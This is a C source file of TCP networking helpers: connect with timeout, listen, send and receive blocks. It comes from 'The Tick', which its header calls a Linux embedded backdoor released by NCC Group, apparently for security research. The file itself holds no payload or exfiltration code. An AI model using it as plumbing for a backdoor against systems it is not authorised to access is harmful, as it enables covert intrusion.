/*
 * The Tick, a Linux embedded backdoor.
 * 
 * Released as open source by NCC Group Plc - http://www.nccgroup.com/
 * Developed by Mario Vilas, mario.vilas@nccgroup.com
 * http://www.github.com/nccgroup/thetick
 * 
 * See the LICENSE file for further details.
*/

#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <stdio.h>
#include <unistd.h>
#include <string.h>
#include <netdb.h>
#include <stdlib.h>
#include <sys/time.h>
#include <fcntl.h>
#include <sys/param.h>
#include <errno.h>

#include "tcp.h"

// Helper function to create a blocking socket with keepalive.
int create_socket(int family)
{
    int fd = socket(family, SOCK_STREAM, 0);
    if (fd >= 0) {
        int true_val = 1;
        setsockopt(fd, SOL_SOCKET, SO_KEEPALIVE, &true_val, sizeof(true_val));
    }
    return fd;
}

// Helper function to connect a socket with a connection timeout.
int connect_socket(int fd, const struct sockaddr *sa, size_t count)
{
    fd_set fdset;
    struct timeval timeout;
    int fdopts = 0;
    int status = 0;
    int so_error = -1;
    socklen_t so_error_len = sizeof(so_error);

    // Set the socket in non blocking mode before connecting.
    fdopts = fcntl(fd, F_GETFL, 0);
    fdopts = fdopts | O_NONBLOCK;
    fcntl(fd, F_SETFL, fdopts);

    // Begin connecting the socket. This will not block anymore.
    connect(fd, sa, count);

    // This will hold the connection timeout value.
    FD_ZERO(&fdset);
    FD_SET(fd, &fdset);
    timeout.tv_sec = 10;    // 10 second timeout
    timeout.tv_usec = 0;

    // Wait for connection or timeout.
    status = select(fd + 1, NULL, &fdset, NULL, &timeout);
    getsockopt(fd, SOL_SOCKET, SO_ERROR, &so_error, &so_error_len);

    // Revert to blocking mode now that we're done waiting.
    fdopts = fdopts & (~O_NONBLOCK);
    fcntl(fd, F_SETFL, fdopts);

    // Return the connected socket on success, -1 on error.
    if(status != 1 || so_error != 0) {
        return -1;
    }
    return fd;
}

// Connects to the given hostname and port. Supports IPv6 and IPv6.
// On error returns -1.
int connect_to_host(const char *hostname, int port)
{
    struct hostent *he = NULL;
    int fd = -1;

    // First, let's resolve the hostname. If we don't want any DNS queries then
    // an IP address can be specified instead of a hostname. This should support
    // both IPv6 and IPv6 in all systems, hopefully, but your mileage may vary.
    if ( (he = gethostbyname(hostname)) == NULL || he->h_addr == NULL) {
        printf("Cannot resolve host %s\n", hostname);
        return -1;
    }

    // Now we have different connection routines for IPv4 and IPv6.
    if (he->h_addrtype == AF_INET) {
        struct sockaddr_in sa;
        memset((void *) &sa, 0, sizeof(sa));
        memcpy((void *) &sa.sin_addr, (void *) he->h_addr, sizeof(sa.sin_addr));
        sa.sin_family = AF_INET;
        sa.sin_port = htons(port);
        if ( ((fd = create_socket(AF_INET)) < 0) || (connect_socket(fd, (const struct sockaddr *) &sa, sizeof(sa)) < 0) ) {
            printf("Cannot connect to %s:%d\n", hostname, port);
            return -1;
        }
    } else if (he->h_addrtype == AF_INET6) {
        struct sockaddr_in6 sa;
        memset((void *) &sa, 0, sizeof(sa));
        memcpy((void *) &sa.sin6_addr, (void *) he->h_addr, sizeof(sa.sin6_addr));
        sa.sin6_family = AF_INET6;
        sa.sin6_port = htons(port);
        if ( (fd = create_socket(AF_INET6)) < 0 || connect_socket(fd, (const struct sockaddr *) &sa, sizeof(sa)) < 0 ) {
            printf("Cannot connect to %s:%d\n", hostname, port);
            return -1;
        }
    } else {
        printf("Internal error\n");
        return -1;
    }

    // We are connected, return the socket file descriptor.
    return fd;
}

// Helper function to set up a listening socket.
// Bind address will usually be INADDR_ANY or INADDR_LOOPBACK.
// If port 0 is specified a random port will be opened and the
// actual port number that was chosen will be written back.
// Returns the socket on success or -1 on error.
// NOTE: currently only IPv4 is supported.
int listen_on_port(const char *bind_addr, int *port)
{
    // Create a new socket.
    int sock = create_socket(AF_INET);
    if (sock < 0) {
        printf("Internal error\n");
        return -1;
    }

    // Attempt to reuse the port when binding if needed.
    // Ignore any errors on this call.
    int so_reuseaddr = 1;
    setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &so_reuseaddr, sizeof(so_reuseaddr));

    // Bind the socket to the given address and port.
    // NOTE: currently only IPv4 is supported.
    struct sockaddr_in serv_addr;
    memset(&serv_addr, 0, sizeof(serv_addr));
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(*port);
    inet_aton(bind_addr, &serv_addr.sin_addr);
    if (bind(sock, (struct sockaddr*) &serv_addr, sizeof(serv_addr)) != 0) {
        close(sock);
        printf("Cannot bind to %s:%d\n", bind_addr, *port);
        return -1;
    }

    // Get the port number back from the socket.
    // That way if bind() picked a random port we know which one it is.
    if (*port == 0) {
        socklen_t serv_addr_len = sizeof(serv_addr);
        if (getsockname(sock, (struct sockaddr*) &serv_addr, &serv_addr_len) != 0) {
            close(sock);
            printf("Internal error\n");
            return -1;
        }
        *port = ntohs(serv_addr.sin_port);
        if (*port == 0) {
            close(sock);
            printf("Internal error\n");
            return -1;
        }
    }

    // Listen for incoming connections.
    if (listen(sock, SOMAXCONN) < 0) {
        close(sock);
        printf("Cannot listen on port %d\n", *port);
        return -1;
    }

    // Return the socket on success.
    return sock;
}

// Sends a block of data over a TCP socket.
// Does not return until all data has been sent.
// Returns 0 on success or -1 if the connection was interrupted.
int send_block(int fd, const char *buf, size_t count)
{
    ssize_t data_sent = -1;

    while (count > 0) {
        data_sent = write(fd, (const void *) buf, count);
        if (data_sent < 0) {
            printf("Connection interrupted!\n");
            return -1;
        }
        buf = buf + data_sent;
        count = count - data_sent;
    }
    return 0;
}

// Reads a block of data from a TCP socket.
// Does not return until all data has been read.
// Returns 0 on success or -1 if the connection was interrupted.
int recv_block(int sock, char *buf, size_t count)
{
    ssize_t data_recv = -1;

    while (count > 0) {
        data_recv = recv(sock, (void *) buf, count, 0);
        if (data_recv <= 0) {
            printf("Connection interrupted!\n");
            return -1;
        }
        buf = buf + data_recv;
        count = count - data_recv;
    }
    return 0;
}

// Consume "count" bytes from socket "fd" and discard them.
// Returns the number of bytes discarded, or -1 on error.
ssize_t consume_extra_data(int fd, size_t count)
{
    ssize_t bytes = 0;
    ssize_t total = 0;
    char buffer[256];
    while (count != 0) {
        bytes = recv(fd, (void *) &buffer, MIN(sizeof(buffer), count), 0);
        if (bytes <= 0) {
            return -1;
        }
        total = total + bytes;
        count = count - (size_t) bytes;
    }
    return total;
}

// Close a TCP connection in a "nice" way.
void disconnect_tcp(int fd)
{
    if (fd >= 0) {
        shutdown(fd, SHUT_RD);
        close(fd);
    }
}
